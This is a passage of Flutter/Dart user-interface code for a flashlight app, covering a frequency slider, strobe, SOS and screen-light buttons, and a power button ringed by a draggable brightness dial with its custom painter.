                              ],
                            ),
                          ),

                          // --- Main Power Button with Brightness Ring ---
                          _buildPowerButtonWithBrightnessRing(outputColor, panelColor),

                          // --- Bottom Control Deck ---
                          Container(
                            padding: const EdgeInsets.all(20),
                            decoration: BoxDecoration(
                              color: panelColor,
                              borderRadius: BorderRadius.circular(16),
                              border: Border.all(color: Colors.white10),
                            ),
                            child: Column(
                              children: [
                                // PWR Hz Slider — discrete steps
                                Row(
                                  children: [
                                    const Text('PWR', style: TextStyle(color: Colors.white54, fontFamily: 'monospace', fontWeight: FontWeight.bold)),
                                    Expanded(
                                      child: SliderTheme(
                                        data: SliderTheme.of(context).copyWith(
                                          trackHeight: 8,
                                          activeTrackColor: _isStealthConnected ? dangerColor : accentColor,
                                          inactiveTrackColor: Colors.black,
                                          thumbColor: Colors.white,
                                          overlayColor: accentColor.withValues(alpha: 0.2),
                                          thumbShape: const RoundSliderThumbShape(enabledThumbRadius: 12),
                                          trackShape: const RoundedRectSliderTrackShape(),
                                        ),
                                        child: Slider(
                                          value: _dialHz.toDouble(),
                                          min: 1,
                                          max: 250,
                                          divisions: 249,
                                          onChanged: (val) {
                                            _triggerHaptic();
                                            setState(() {
                                              _dialHz = val.round();
                                            });
                                          },
                                        ),
                                      ),
                                    ),
                                    Text(
                                      '${_dialHz}Hz',
                                      style: TextStyle(
                                        color: _isStealthConnected ? dangerColor : Colors.white54,
                                        fontFamily: 'monospace',
                                        fontWeight: FontWeight.bold,
                                        fontSize: 12,
                                      ),
                                    ),
                                  ],
                                ),
                                const SizedBox(height: 24),
                                
                                // Mode Toggles
                                Row(
                                  mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                                  children: [
                                    _buildTacticalButton(
                                      icon: Icons.emergency_share,
                                      label: 'STROBE',
                                      isActive: _isStrobeOn,
                                      onTap: _toggleStrobe,
                                      activeColor: dangerColor,
                                    ),
                                    _buildTacticalButton(
                                      icon: Icons.sos,
                                      label: 'S.O.S',
                                      isActive: _isSosOn || _isMicMuted,
                                      onTap: _toggleSos,
                                      onLongPressStart: _handleSosHoldStart,
                                      onLongPressEnd: _handleSosHoldEnd,
                                      holdProgress: (_sosHoldTicks > 0 && _sosHoldTicks < 20) ? (_sosHoldTicks / 20.0) : null,
                                      activeColor: _isMicMuted ? const Color(0xFF00E5FF) : const Color(0xFFFF8800),
                                    ),
                                    _buildTacticalButton(
                                      icon: Icons.phone_android,
                                      label: 'SCR_LIGHT',
                                      isActive: _isScreenLightOn,
                                      onTap: _toggleScreenLight,
                                      activeColor: accentColor,
                                    ),
                                  ],
                                )
                              ],
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              );
            },
          ),
      ),
    );
  }

  /// Power button with a circular brightness dial around it
  Widget _buildPowerButtonWithBrightnessRing(Color dynamicColor, Color panelColor) {
    return SizedBox(
      width: 260,
      height: 260,
      child: Stack(
        alignment: Alignment.center,
        children: [
          // Brightness ring (custom painted arc)
          SizedBox(
            width: 260,
            height: 260,
            child: CustomPaint(
              painter: _BrightnessRingPainter(
                value: _dialBrightness / 100.0,
                activeColor: dynamicColor,
              ),
            ),
          ),
          // Circular brightness slider
          GestureDetector(
            onPanStart: (details) {
              // Only start drag if initial touch is near the ring
              final center = Offset(130, 130);
              final pos = details.localPosition;
              final dx = pos.dx - center.dx;
              final dy = pos.dy - center.dy;
              final distance = sqrt(dx * dx + dy * dy);
              if (distance >= 85 && distance <= 135) {
                _isDraggingBrightness = true;
              }
            },
            onPanUpdate: (details) {
              if (!_isDraggingBrightness) return;
              
              // Calculate angle from center regardless of distance
              final center = Offset(130, 130);
              final pos = details.localPosition;
              final dx = pos.dx - center.dx;
              final dy = pos.dy - center.dy;
              
              var angle = atan2(dy, dx) + pi / 2;
              if (angle < 0) angle += 2 * pi;
              
              // Map angle to 1-100
              final fraction = (angle / (2 * pi)).clamp(0.0, 1.0);
              final newBrightness = (fraction * 100).round().clamp(1, 100);
              
              if (newBrightness != _dialBrightness) {
                _triggerHaptic();
                setState(() {
                  _dialBrightness = newBrightness;
                });
              }
            },
            onPanEnd: (_) => _isDraggingBrightness = false,
            onPanCancel: () => _isDraggingBrightness = false,
            child: Container(
              width: 260,
              height: 260,
              color: Colors.transparent,
            ),
          ),
          // Inner power button
          GestureDetector(
            onTap: _toggleLed,
            child: Container(
              width: 180,
              height: 180,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: panelColor,
                border: Border.all(
                  color: _isLedOn ? dynamicColor : Colors.white12,
                  width: 4,
                ),
                boxShadow: _isLedOn
                    ? [
                        BoxShadow(
                          color: dynamicColor.withValues(alpha: 0.3),
                          blurRadius: 40,
                          spreadRadius: 10,
                        ),
                        const BoxShadow(
                          color: Colors.black87,
                          blurRadius: 20,
                          offset: Offset(0, 10),
                        )
                      ]
                    : [
                        const BoxShadow(
                          color: Colors.black87,
                          blurRadius: 20,
                          offset: Offset(0, 15),
                        ),
                        BoxShadow(
                          color: Colors.white.withValues(alpha: 0.05),
                          blurRadius: 5,
                          spreadRadius: -2,
                          offset: const Offset(0, -2),
                        )
                      ],
              ),
              child: Stack(
                alignment: Alignment.center,
                children: [
                  Container(
                    width: 140,
                    height: 140,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      gradient: RadialGradient(
                        colors: _isLedOn
                            ? [dynamicColor.withValues(alpha: 0.2), panelColor]
                            : [const Color(0xFF22282D), const Color(0xFF111417)],
                      ),
                      border: Border.all(color: Colors.black54, width: 2),
                    ),
                  ),
                  Icon(
                    Icons.power_settings_new_rounded,
                    size: 64,
                    color: _isLedOn ? dynamicColor : Colors.grey[700],
                  ),
                  // Small brightness value label at bottom of button
                  Positioned(
                    bottom: 28,
                    child: Text(
                      '$_dialBrightness',
                      style: TextStyle(
                        color: dynamicColor,
                        fontFamily: 'monospace',
                        fontSize: 11,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildScreenLightMode(Color accentColor) {
    return GestureDetector(
      onTap: () {
        setState(() {
          _screenLightColorIndex = (_screenLightColorIndex + 1) % _tacticalColors.length;
        });
      },
      child: Stack(
        children: [
          Container(color: _tacticalColors[_screenLightColorIndex]),
          Center(
            child: IconButton(
              iconSize: 100,
              icon: Icon(Icons.power_settings_new, color: Colors.black.withValues(alpha: 0.3)),
              onPressed: _toggleScreenLight,
            ),
          ),
          Positioned(
            bottom: 40,
            left: 40,
            right: 40,
            child: Slider(
              value: _screenIntensity,
              min: 0.1,
              max: 1.0,
              activeColor: Colors.black,
              inactiveColor: Colors.black.withValues(alpha: 0.3),
              onChanged: _updateScreenIntensity,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildTelemetryStat(String label, String value, Color valueColor) {
    return Column(
      children: [
        Text(
          label,
          style: const TextStyle(
            color: Colors.white38,
            fontSize: 10,
            fontFamily: 'monospace',
            fontWeight: FontWeight.bold,
          ),
        ),
        const SizedBox(height: 4),
        Text(
          value,
          style: TextStyle(
            color: valueColor,
            fontSize: 14,
            fontFamily: 'monospace',
            fontWeight: FontWeight.w900,
          ),
        ),
      ],
    );
  }

  Widget _buildTacticalButton({
    required IconData icon,
    required String label,
    required bool isActive,
    required VoidCallback onTap,
    required Color activeColor,
    void Function(LongPressStartDetails)? onLongPressStart,
    VoidCallback? onLongPressEnd,
    double? holdProgress,
  }) {
    return GestureDetector(
      onTap: () {
        _triggerHaptic();
        onTap();
      },
      onLongPressStart: onLongPressStart,
      onLongPressEnd: onLongPressEnd != null ? (_) => onLongPressEnd() : null,
      onLongPressCancel: onLongPressEnd,
      child: TweenAnimationBuilder<double>(
        tween: Tween(begin: 0.0, end: isActive ? 1.0 : 0.0),
        duration: const Duration(milliseconds: 300),
        builder: (context, val, child) {
          return Container(
            width: 85,
            padding: const EdgeInsets.symmetric(vertical: 12),
            decoration: BoxDecoration(
              color: Color.lerp(const Color(0xFF101214), activeColor.withValues(alpha: 0.15), val),
              borderRadius: BorderRadius.circular(8),
              border: Border.all(
                color: Color.lerp(Colors.white10, activeColor, val)!,
                width: 2,
              ),
              boxShadow: isActive
                  ? [BoxShadow(color: activeColor.withValues(alpha: 0.3 * val), blurRadius: 15 * val)]
                  : [const BoxShadow(color: Colors.black54, blurRadius: 5, offset: Offset(0, 3))],
            ),
            child: Column(
              children: [
                Stack(
                  alignment: Alignment.center,
                  children: [
                    if (holdProgress != null && holdProgress > 0)
                      SizedBox(
                        width: 32,
                        height: 32,
                        child: CircularProgressIndicator(
                          value: holdProgress,
                          strokeWidth: 2,
                          valueColor: AlwaysStoppedAnimation<Color>(activeColor),
                        ),
                      ),
                    Icon(
                      icon,
                      color: Color.lerp(Colors.grey[600], activeColor, val),
                      size: 26,
                    ),
                  ],
                ),
                const SizedBox(height: 6),
                Text(
                  label,
                  style: TextStyle(
                    color: Color.lerp(Colors.grey[600], activeColor, val),
                    fontFamily: 'monospace',
                    fontSize: 11,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 1,
                  ),
                ),
              ],
            ),
          );
        },
      ),
    );
  }

}

/// Custom painter for the brightness ring around the power button
class _BrightnessRingPainter extends CustomPainter {
  final double value; // 0.0 to 1.0
  final Color activeColor;

  _BrightnessRingPainter({required this.value, required this.activeColor});

  @override
  void paint(Canvas canvas, Size size) {
    final center = Offset(size.width / 2, size.height / 2);
    final radius = size.width / 2 - 8;

    // Background ring
    final bgPaint = Paint()
      ..color = Colors.white10
      ..style = PaintingStyle.stroke
      ..strokeWidth = 6
      ..strokeCap = StrokeCap.round;

    canvas.drawCircle(center, radius, bgPaint);

    // Active arc
    final activePaint = Paint()
      ..color = activeColor
      ..style = PaintingStyle.stroke
      ..strokeWidth = 6
      ..strokeCap = StrokeCap.round;

    final sweepAngle = value * 2 * pi;
    canvas.drawArc(
      Rect.fromCircle(center: center, radius: radius),
      -pi / 2, // Start from top
      sweepAngle,
      false,
      activePaint,
    );

    // Draw tick marks
    final tickPaint = Paint()
      ..color = Colors.white24
      ..style = PaintingStyle.stroke
      ..strokeWidth = 1;

    for (int i = 0; i < 20; i++) {
      final angle = (i / 20) * 2 * pi - pi / 2;
      final innerR = radius - 12;
      final outerR = radius - 4;
      final p1 = Offset(center.dx + innerR * cos(angle), center.dy + innerR * sin(angle));
      final p2 = Offset(center.dx + outerR * cos(angle), center.dy + outerR * sin(angle));
      canvas.drawLine(p1, p2, tickPaint);
    }
  }

  @override
  bool shouldRepaint(covariant _BrightnessRingPainter oldDelegate) {
    return oldDelegate.value != value || oldDelegate.activeColor != activeColor;
  }
}
